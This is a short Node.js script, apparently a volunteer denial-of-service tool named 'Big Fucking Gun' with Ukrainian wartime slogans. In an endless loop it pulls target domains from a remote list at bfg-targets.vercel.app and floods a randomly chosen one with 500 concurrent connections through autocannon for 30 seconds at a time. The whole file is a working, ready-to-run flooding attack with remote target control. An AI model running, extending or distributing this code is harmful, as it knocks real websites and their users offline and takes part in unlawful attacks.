const fetch = require("node-fetch");
const autocannon = require("autocannon");
const ProgressBar = require('progress');

const TARGETS_URL = "https://bfg-targets.vercel.app/";
const ATTACK_DURATION = 30 // s

const attack = async () => {
  console.log("\n\nFetching target...");

  const targets = await fetch(TARGETS_URL).then((r) => r.json());
  const target = targets[Math.floor(Math.random() * targets.length)]

  const url = target.domain;
  const method = target.method || "GET";
  const headers = target.headers || {};
  const body = target.body || undefined;
  const connectionRate = target.rps || undefined;
  const connections = target.connections || 500;
  
  console.log(`Attacking ${url}...`)
  const bar = new ProgressBar(`[:bar]`, { total: ATTACK_DURATION });
  const timer = setInterval(() => bar.tick(), 1000)

  const result = await autocannon({
    url,
    method,
    headers,
    body,
    workers: 4,
    connections,
    duration: ATTACK_DURATION,
    connectionRate,
  });

  clearInterval(timer);

  console.log(`Requests: ${result.requests.sent}`);
  console.log("Response codes:");
  console.table({
    "1xx": result["1xx"],
    "2xx": result["2xx"],
    "3xx": result["3xx"],
    "4xx": result["4xx"],
    "5xx": result["5xx"],
  });
};

const start = async () => {
  try {
    await attack();
  } catch (err) {
    console.error("ERROR:");
    console.error(err);
  }
  await new Promise((resolve) => setTimeout(resolve, 1000));
  start();
};

console.log("Big Fucking Gun, version 0.0.4-beta\n");
console.log("================================");
console.log("Слава Україні!\nГероям Слава!\nСлава Нації!\nСмерть ворогам!");
console.log("================================");

start();
